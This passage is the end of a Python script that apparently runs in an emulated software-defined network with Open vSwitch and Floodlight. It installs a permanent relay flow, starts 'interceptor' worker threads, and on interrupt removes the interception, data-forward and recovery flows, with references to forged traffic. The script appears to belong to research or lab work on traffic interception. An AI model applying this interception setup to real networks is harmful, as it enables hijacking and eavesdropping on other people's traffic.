|  Phase B: S1 → neighbor → Floodlight broadcast on vMAC  |
|  Data fwd: S1 → uplink direct (no controller)           |
+----------------------------------------------------------+
""")

    # Install a permanent flow on s7 so relay-addressed packets are NEVER flooded.
    # Problem: relay only ever *receives* traffic, so Floodlight never sees
    # relay_mac as eth.src and never installs a forwarding flow for it.
    # Floodlight's learned flows also expire after ~5s idle timeout.
    # Result: every packet with eth_dst=relay_mac gets flooded to all s7 ports
    # including toward s8/hb, causing spurious entries in captures.
    # Fix: install a high-priority permanent OVS flow on s7 directly —
    # no Floodlight involvement, never expires.
    # relay is s7 port 5 (3 inter-switch links + h7 + relay, in edge order).
    print(f"[*] Installing permanent relay-unicast flow on s7 (port 5) …")
    add_flow("s7", PRI_DATA_FWD,
             f"eth_dst={RELAY_MAC}",
             "output:5")
    print(f"[*] s7: eth_dst={RELAY_MAC} → output:5 (relay port). No more floods to hb.")

    learned:      dict           = {}
    learned_lock: threading.Lock = threading.Lock()

    workers = []
    for interceptor in INTERCEPTORS:
        t = threading.Thread(
            target=interceptor_worker,
            args=(interceptor, learned, learned_lock),
            daemon=True,
            name=f"worker[{interceptor['name']}]",
        )
        t.start()
        workers.append(t)
        print(f"[*] Worker started: {interceptor['name']} "
              f"({interceptor['intercept_bridge']} port {interceptor['intercept_port']})")

    try:
        for t in workers:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted — cleaning up flows …")
        # Remove relay-unicast flow from s7
        del_flow("s7", f"eth_dst={RELAY_MAC}")
        with learned_lock:
            for flow_info in learned.values():
                flow_info["stop_event"].set()
                flow_info["forged_stop"].set()
            for flow_info in learned.values():
                d = flow_info["direction"]
                # Remove all flows on intercepting switch for this source port
                del_flow(d["intercept_bridge"], f"in_port={d['intercept_port']},ip")
                # Remove data-forward flow (matched by src/dst IP — no --strict needed)
                del_flow(d["intercept_bridge"],
                         f"ip,nw_src={flow_info['sIP']},nw_dst={flow_info['dIP']}")
                # Remove recovery flow on destination switch
                del_flow(d["recovery_bridge"],
                         f"ip,nw_src={RELAY_IP},nw_dst={flow_info['dIP']}")
        print("[*] Done.")


if __name__ == "__main__":
    main()
